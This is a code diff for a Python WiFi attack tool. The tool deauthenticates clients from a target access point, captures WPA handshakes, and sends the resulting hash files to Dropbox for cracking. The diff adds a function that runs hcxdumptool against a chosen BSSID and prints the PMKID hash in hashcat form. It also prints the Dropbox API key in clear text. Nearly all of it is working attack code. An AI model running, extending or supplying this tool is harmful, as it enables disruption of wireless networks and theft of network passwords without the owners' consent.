@@ -7,12 +7,13 @@ import threading
 import time
 from datetime import datetime
 import dropbox as dropbox
+import pyshark as pyshark
 from dropbox.files import WriteMode
 from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
 from scapy.layers.eap import EAPOL
 from scapy.sendrecv import sendp, sniff
 from scapy.utils import PcapWriter
-#test
+global pmkid_file
 
 class bcolors:
     HEADER = '\033[95m'
@@ -32,6 +33,15 @@ ENABLE_DROPBOX_UPLOAD = False
 packet_list = []
 
 
+def check_depends():
+    if shutil.which("cap2hccapx.bin") is None:
+        print("Can't find cap2hccapx.bin in PATH, Exiting..")
+        sys.exit()
+    if shutil.which("hcxdumptool") is None:
+        print("Can't find hcxdumptool in PATH, Exiting..")
+        sys.exit()
+
+
 def check_monitor(iface):
     monitor = subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True)
 
@@ -41,11 +51,11 @@ def check_monitor(iface):
         subprocess.call('ip link set %s up' % iface, shell=True)
         if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode() \
                 .strip() != "monitor":
-            print(f"{bcolors.FAIL}Failed to set %s monitor mode. Exiting..{bcolors.ENDC}" % iface)
+            print('Failed to set %s monitor mode. Exiting..' % iface)
             sys.exit()
 
     if monitor.decode().strip() != "monitor":
-        print(f"{bcolors.OKGREEN}WiFi Device not in monitor mode!{bcolors.ENDC}")
+        print('WiFi Device not in monitor mode!')
         answer = input('Let Deauther try to put WiFi interface into monitor mode?(y/n)')
         if answer == 'y':
             _try_monitor()
@@ -56,7 +66,7 @@ def check_monitor(iface):
 
 def is_root():
     if os.geteuid() != 0:
-        print(f"{bcolors.FAIL}This Program must run with root privileges, Exiting...{bcolors.ENDC}")
+        print("This Program must run with root privileges, Exiting...")
         sys.exit()
 
 
@@ -117,6 +127,35 @@ def cap_converter():
         print(f"{bcolors.FAIL}can't find cap2hccapx.bin in PATH{bcolors.ENDC}\n")
 
 
+def try_pmkid(iface, pcap_file, channel, ap):
+    def _find_pmkids(pmkid_file):
+        packets = pyshark.FileCapture(pmkid_file, display_filter=f'wlan.bssid == {ap.lower()} && wlan.rsn.ie.pmkid > 0')
+        for packet in packets:
+            try:
+                subtype = packet.wlan.fc_type_subtype.showname_value
+
+                if 'QoS Data' in subtype:
+                    print(f"Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}")
+                    return
+            except:
+                pass
+
+        print("Didn't find PMKID!")
+
+
+    ap_file = open('ap_filter.mac', 'w+')
+    ap_file.write(ap.strip().upper())
+    pmkid_file = os.path.splitext(pcap_file)[0] + '.pmkid.pcapng'
+    ap_file.close()
+    mac = os.path.abspath(os.getcwd() + '/ap_filter.mac')
+    print(mac)
+    try:
+        subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}", shell=True, timeout=20)
+
+    except subprocess.TimeoutExpired:
+        _find_pmkids(pmkid_file)
+
+
 def send_deauth_packet():
     pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
     sendp(pkt1, count=deauth_count, iface=iface, verbose=False)
@@ -124,12 +163,12 @@ def send_deauth_packet():
 
 def dropbox_uploader():
     try:
-        key_file_handle=open(DROPBOX_KEY_PATH,'r')
+        key_file_handle = open(DROPBOX_KEY_PATH, 'r')
         dropbox_key = key_file_handle.read()
         dbx = dropbox.Dropbox(dropbox_key)
         rootdir = os.getcwd()
         print("Attempting to upload...")
-        print("Using key " + dropbox_key);
+        print("Using key " + dropbox_key)
         for dir, dirs, files in os.walk(rootdir):
             for file in files:
                 if file.endswith('.22000'):
@@ -149,11 +188,13 @@ def dropbox_uploader():
 if __name__ == '__main__':
     is_root()
     print_banner()
+    check_depends()
     iface, ap, client, channel, deauth_count, timeout, pcap_file, enable_upload = check_args()
     check_monitor(iface)
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
     # current time in the middle of pcap file name
     os.system('iwconfig %s channel %s' % (iface, channel))  # Set WiFi Adapter On right Channel
+    try_pmkid(iface, pcap_file, channel, ap)
     t = threading.Thread(target=sniffer)  # Configure Sniffing in backgroud.
     t.start()  # Start Sniffing in the backgroud.
     time.sleep(2)  # Wait 2 seconds for sniffing to start.
